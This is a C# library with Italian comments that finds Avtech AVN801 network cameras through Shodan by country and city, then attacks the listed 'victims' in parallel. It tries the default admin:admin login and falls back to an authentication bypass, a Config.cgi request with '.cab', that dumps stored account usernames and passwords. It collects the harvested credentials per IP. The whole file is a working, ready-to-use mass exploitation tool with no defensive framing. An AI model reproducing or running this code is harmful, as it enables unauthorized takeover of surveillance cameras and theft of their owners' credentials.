using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Threading;
using System.Text.RegularExpressions;
using Avtechlib.Avtechinfo;
using Leaf.xNet;

namespace Avtechlib
{
    /// <summary>
    /// Classe per la scansione e attacco dei servizi di videosorveglianza Avtech
    /// </summary>
    public class Avtech
    {
        /// <summary>
        /// Campo della classe Token per fermare l'attacco
        /// </summary>
        private CancellationTokenSource Task_Token;

        /// <summary>
        /// Campo che indica se l'attacco parallelo è iniziato
        /// </summary>
        private bool Parallel_Run = false;

        /// <summary>
        /// Evento che avvisa quanti ip sono stati testati
        /// </summary>
        public event EventHandler<Test_Info> Info_Tested;

        /// <summary>
        /// Evento che avvisa quando lo scan è terminato restituendo un istanza Ip_Info
        /// </summary>
        public event EventHandler<Ip_Info> Scan_Terminato;

        /// <summary>
        /// Evento che avvisa quando l'attacco è terminato restituendo un istanza Attack_Info
        /// </summary>
        public event EventHandler<Attack_Info> Attack_Terminato;

        /// <summary>
        /// Metodo Sincrono per la scansione del servizio Avtech AVN801 tramite shodan
        /// </summary>
        /// <param name="Shodan_Api">Api di shodan</param>
        /// <param name="Paese">Paese target ES: IT</param>
        /// <param name="Citta">Città del paese target ES: Naples</param>
        /// <param name="Pagina">Pagina di shodan da visionare 1 pagina = max 100 risultati = 1 credito</param>
        /// <returns>Restituisce l'istanza Ip_Info con tutte le informazioni sulla scansione</returns>
        public Ip_Info Scan_Sync(string Shodan_Api, string Paese, string Citta, byte Pagina)
        {
            switch (string.IsNullOrWhiteSpace(Shodan_Api))
            {
                case true:
                    throw new ArgumentException("Controllare l'api.", "Shodan_Api");
            }

            switch (string.IsNullOrWhiteSpace(Paese))
            {
                case true:
                    throw new ArgumentException("Controlla il paese.", "Paese");
            }

            switch (string.IsNullOrWhiteSpace(Citta))
            {
                case true:
                    throw new ArgumentException("Controlla la città.", "Citta");
            }

            switch (Pagina)
            {
                case 0:
                    Pagina = 1;
                    break;
            }

            Ip_Info ip_Info = new Ip_Info();

            using (HttpRequest Richiesta_Api = new HttpRequest())
            {
                try
                {
                    while (true)
                    {
                        HttpResponse Risposta_Api = Richiesta_Api.Get($"https://api.shodan.io/shodan/host/search?key={Shodan_Api}&query=product:\"Avtech AVN801 network camera\" country:\"{Paese}\" city:\"{Citta}\"&page={Pagina}");
                        dynamic Jconv = JsonConvert.DeserializeObject(Risposta_Api.ToString());
                        if (Jconv["total"] != "0")
                        {
                            if (Convert.ToString(Jconv["matches"]) != "[]")
                            {
                                foreach (var Valore in Jconv["matches"])
                                {
                                    ip_Info.Ip_Port_Add = Valore["ip_str"] + ":" + Valore["port"];
                                }
                                break;
                            }
                            else
                            {
                                Pagina--;
                                continue;
                            }
                        }
                        else
                        {
                            break;
                        }
                    }
                }
                catch (HttpException Errore_Http)
                {
                    switch (Errore_Http.HttpStatusCode)
                    {
                        case HttpStatusCode.Unauthorized:
                            throw new ArgumentException("Errore http 401, Api non valida.","Shodan_Api");
                        default:
                            throw new Exception(Errore_Http.Message + " " + Errore_Http.HttpStatusCode);
                    }
                }
            }

            Scan_Terminato?.Invoke(this, ip_Info);
            return ip_Info;
        }

        /// <summary>
        /// Metodo Asincrono per la scansione del servizio Avtech AVN801 tramite shodan
        /// </summary>
        /// <param name="Shodan_Api">Api di shodan</param>
        /// <param name="Paese">Paese target ES: IT</param>
        /// <param name="Citta">Città del paese target ES: Naples</param>
        /// <param name="Pagina">Pagina di shodan da visionare 1 pagina = max 100 risultati = 1 credito</param>
        /// <returns>Restituisce l'istanza Ip_Info con tutte le informazioni sulla scansione</returns>
        public Task<Ip_Info> Scan_Async(string Shodan_Api, string Paese, string Citta, byte Pagina)
        {
            return Task.Run(() => Scan_Sync(Shodan_Api, Paese, Citta, Pagina));
        }

        /// <summary>
        /// Metodo Sincrono per iniziare l'attacco, attacchi eseguiti: Brute e Bypass
        /// </summary>
        /// <param name="Vittime">Indirizzi ip delle vittime</param>
        /// <param name="Threads">Threads per le operazioni parallele</param>
        /// <returns>Restituisce l'istanza Attack_Info con tutte le informazioni dell'attacco</returns>
        public Attack_Info Attack_Sync(string[] Vittime, byte Threads)
        {
            switch (Vittime.Length)
            {
                case 0:
                    throw new ArgumentException("Array nullo, non ci sono ip vittime.", "Vittime");
            }

            switch (Threads)
            {
                case 0:
                    Threads = 1;
                    break;
            }

            Test_Info Test_Info = null;

            if (Info_Tested != null)
            {
                Test_Info = new Test_Info(Vittime.Length);
            }

            Attack_Info Attack_Info = new Attack_Info();

            using (Task_Token = new CancellationTokenSource())
            {
                try
                {
                    ParallelOptions OPT = new ParallelOptions();
                    OPT.MaxDegreeOfParallelism = Threads;
                    OPT.CancellationToken = Task_Token.Token;
                    Parallel_Run = true;

                    Parallel.ForEach(Vittime, OPT, Run =>
                    {
                        try
                        {
                            using (HttpRequest Richiesta_Login = new HttpRequest())
                            {
                                HttpResponse Risposta_Admin = Richiesta_Login.Get(Run + "/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&login=quick");
                                if (Risposta_Admin.ToString().Contains("OK"))
                                {
                                    Attack_Info.Ip_Port_Cred_Add = Run + "|admin:admin|Brute";
                                }
                                else if (Risposta_Admin.ToString().Contains("ERROR: Authentication error."))
                                {
                                    HttpResponse Risposta_Bypass = Richiesta_Login.Get(Run + "/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*");
                                    if (Risposta_Bypass.ToString().Contains("OK"))
                                    {
                                        Match Username_Match = Regex.Match(Risposta_Bypass.ToString(), "Account.User" + @"[\d]*.Username=[\S]*");
                                        Match Passowrd_Match = Regex.Match(Risposta_Bypass.ToString(), "Account.User" + @"[\d]*.Password=[\S]*");
                                        if (Username_Match.Success && Passowrd_Match.Success)
                                        {
                                            string Username = Regex.Replace(Username_Match.Value, "Account.User" + @"[\d]*", "").Replace(".Username=", "");
                                            string Password = Regex.Replace(Passowrd_Match.Value, "Account.User" + @"[\d]*", "").Replace(".Password=", "");
                                            Attack_Info.Ip_Port_Cred_Add = Run + $"|{Username}:{Password}|Bypass";
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                        //Errori pass
                        }

                        if (Info_Tested != null)
                        {
                            Test_Info.Ips_Testati_Totali += 1;
                            Info_Tested(this, Test_Info);
                        }
                    });

                    Parallel_Run = false;
                }
                catch (OperationCanceledException)
                {
                    //Annullo task
                    Parallel_Run = false;
                }
            }

            Attack_Terminato?.Invoke(this, Attack_Info);
            return Attack_Info;
        }

        /// <summary>
        /// Metodo Asincrono per iniziare l'attacco, attacchi eseguiti: Brute e Bypass
        /// </summary>
        /// <param name="Vittime">Indirizzi ip delle vittime</param>
        /// <param name="Threads">Threads per le operazioni parallele</param>
        /// <returns>Restituisce l'istanza Attack_Info con tutte le informazioni dell'attacco</returns>
        public Task<Attack_Info> Attack_Async(string[] Vittime, byte Threads)
        {
            return Task.Run(() => Attack_Sync(Vittime, Threads));
        }

        /// <summary>
        /// Metodo per terminare l'attacco
        /// </summary>
        public void Stop_Attack()
        {
            switch(Parallel_Run)
            {
                case true:
                    Task_Token.Cancel();
                    break;
                case false:
                    throw new Exception("Attacco non avviato o già terminato...");
            }
        }

    }

    namespace Avtechinfo
    {
        /// <summary>
        /// Classe che contiene le informazioni su ip e porte trovate nella scansione tramite shodan
        /// </summary>
        public class Ip_Info : EventArgs
        {
            /// <summary>
            /// Lista che contiene ip e porta trovati
            /// </summary>
            private List<string> Ip_Port = new List<string>();

            /// <summary>
            /// Proprietà per visualizzare il numero dei vari ip trovati
            /// </summary>
            public int Ip_Trovati
            {
                get { return Ip_Port.Count; }
            }

            /// <summary>
            /// Proprietà per settare un nuovo ip:porta nella lista dei vari indirizzi trovati
            /// </summary>
            internal string Ip_Port_Add
            {
                set { Ip_Port.Add(value); }
            }

            /// <summary>
            /// Proprietà per visulizzare tutti i vari ip:porte trovati
            /// </summary>
            public string[] Ip_Port_Show
            {
                get { return Ip_Port.ToArray(); }
            }
        }

        /// <summary>
        /// Classe che contiene le informazioni delle vittime attaccate
        /// </summary>
        public class Attack_Info : EventArgs
        {
            /// <summary>
            /// Lista che contiene ip:porta e credenziali trovate
            /// </summary>
            private List<string> Ip_Port_Cred = new List<string>();

            /// <summary>
            /// Proprietà per visualizzare il numero delle credenziali trovate
            /// </summary>
            public int Credenziali_Trovate
            {
                get { return Ip_Port_Cred.Count; }
            }

            /// <summary>
            /// Proprietà che permette di aggiungere ip:porta e credenziali trovate nella lista
            /// </summary>
            internal string Ip_Port_Cred_Add
            {
                set { Ip_Port_Cred.Add(value); }
            }

            /// <summary>
            /// Proprietà che restituisce i vari ip:porta con le credenziali trovate
            /// </summary>
            public string[] Ip_Port_Cred_Show
            {
                get { return Ip_Port_Cred.ToArray(); }
            }
        }

        /// <summary>
        /// Classe che contiene le informazioni sul test
        /// </summary>
        public class Test_Info : EventArgs
        {
            /// <summary>
            /// Campo che contiente ip totali da testare
            /// </summary>
            private int Ips = 0;

            /// <summary>
            /// Campo che contiene ip testati
            /// </summary>
            private int Ips_Testati = 0;

            /// <summary>
            /// Costruttore per settare gli indirizzi ip da testare
            /// </summary>
            /// <param name="Ips_Totali">Ip da testare</param>
            public Test_Info(int Ips_Totali)
            {
                Ips = Ips_Totali;
            }

            /// <summary>
            /// Proprietà per visualizzare ip totali
            /// </summary>
            public int Ips_Totali
            {
                get { return Ips; }
            }

            /// <summary>
            /// Proprietà per visualizzare e settare ip testati
            /// </summary>
            public int Ips_Testati_Totali
            {
                get { return Ips_Testati; }
                internal set { Ips_Testati = value; }
            }

            /// <summary>
            /// Proprietà per visualizzare la percentuale dell'attacco
            /// </summary>
            public int Percentuale
            {
                get { return ((Ips_Testati * 100) / Ips); }
            }
        }
    }
}

